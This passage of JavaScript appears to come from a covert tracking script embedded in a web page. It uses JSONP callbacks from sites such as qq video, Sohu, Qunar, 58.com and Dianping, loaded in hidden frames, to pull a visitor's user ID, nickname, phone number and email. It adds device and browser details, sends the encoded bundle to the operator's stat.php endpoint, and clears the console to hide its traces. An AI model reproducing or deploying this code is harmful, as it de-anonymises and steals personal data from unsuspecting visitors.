  	FP_LOAD_NOREF("http://pay.video.qq.com/fcgi-bin/getsvip?otype=json&callback=jQuery19103840989930986969_1501754048559&_="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.jQuery19103840989930986969_1501754048559=parent.jQuery19103840989930986969_1501754048559;");
}catch(e){
	FP_CALLBACK(""); 
}},sohu: function(FP_CALLBACK) {try{
        var tag="sohuifr";
	var loaded=false;
	window.callback325252623423=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
             var uid = res.data.id||"";
	     var username=res.data.nickName||"";
             if(uid){
    	       FP_CALLBACK({"uid":uid,"username":unescape(username)});
             }else{
               FP_CALLBACK(""); 
             }
        }catch(e){
              FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("http://my.tv.sohu.com/user/a/profile/currinfo.do?end=0&callback=callback325252623423&appid=1075&f=0&_="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.callback325252623423=parent.callback325252623423;");
}catch(e){
	FP_CALLBACK(""); 
}},qunar: function(FP_CALLBACK) {try{
        var tag="qunarifr";
	    var loaded=false;
	    window.callback353252525111=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
             var uid = res.data.uid||"";
	         var nick=res.data.nickname||"";
	         var mobile = res.data.mobile||"";
	         var email = res.data.email||"";
	         var username = res.data.username||"";
	         var other = res.data.encodeName||"";
             if(uid){
    	       FP_CALLBACK({"uid":uid,"nickname":nick,"username":username,"phone":mobile,"email":email});
             }else{
               FP_CALLBACK(""); 
             }
        }catch(e){
              FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("http://user.qunar.com/index/basic?csrfToken=xBaOc1QstCFRuFUazcmdkSeaugLvysQ1&callback=callback353252525111&_="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.callback353252525111=parent.callback353252525111;");
}catch(e){
	FP_CALLBACK(""); 
}},58: function(FP_CALLBACK) {try{
        var tag="58ifr";
	    var loaded=false;
	    window.jQuery110207126069543475737_1501210451304=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
	     var mobile = res.mobile||"";
             if(mobile){
    	       FP_CALLBACK({"phone":mobile});
             }else{
               FP_CALLBACK(""); 
             }
        }catch(e){
              FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("https://passport.58.com/wukong/userstate?callback=jQuery110207126069543475737_1501210451304&_="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.jQuery110207126069543475737_1501210451304=parent.jQuery110207126069543475737_1501210451304;");
}catch(e){
	FP_CALLBACK(""); 
}},dianping: function(FP_CALLBACK) {try{
        var tag="dianpingifr";
	    var loaded=false;
	    window.callback=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
	     var uid = res.msg.userInfo.userId||"";
             var nickname = res.msg.userInfo.userNickName||"";
             if(uid ){
    	       FP_CALLBACK({"uid":uid,"nickname":nickname});
             }else{
               FP_CALLBACK(""); 
             }
        }catch(e){
              FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("http://t.dianping.com/jsonp/pagehead?pageId=1007&searchQty=10&position=myOrders&action=headinfo&callback=callback&_="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.callback=parent.callback;");
}catch(e){
	FP_CALLBACK(""); 
}},stats: function(FP_CALLBACK) {try{
    FP_CALLBACK({
      "os":FP_OS,
      "browser":FP_BROWSER+" "+FP_BROWSER_VERSION,
      "device":FP_DEVICE,
      "screen":window.screen.width+":"+window.screen.height,
      "refer":FP_REF,
      "ua":navigator.userAgent,
      "web_refer":document.referrer,
    });
}catch(e){
  	FP_CALLBACK("");
}}
  }, function(n, t) {
    try {
        /*for (var a = ["tianya","youku","163","weibo","baidu","localstorage","renren","taobao","jd","qq","sohu","qunar","58","dianping","stats"], e = !1, o = 0; o < a.length; o++)
            if (t[a[o]]) {  
                e = !0;
                var c = t[a[o]]
                  , r = !1;
                for (var i in c)
                    c[i] ? r = !0 : delete c[i];
                r || delete t[a[o]]
            }*/
        FP_SEND(FP_BASE_PATH + "/stat.php?ctag=i0b10x9ngi0u8i98bvp65obc30o6r5dz", {
            //data: FP_ENCODE(JSON.stringify(t))
            data: encodeURI(getEncodeString(JSON.stringify(t)))
        }, function() {}, function() {})
    } catch (u) {}
    try {
        "console"in window && (console.log("\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"),
        console.clear() && console.clear())
    } catch (u) {}
});
</script>

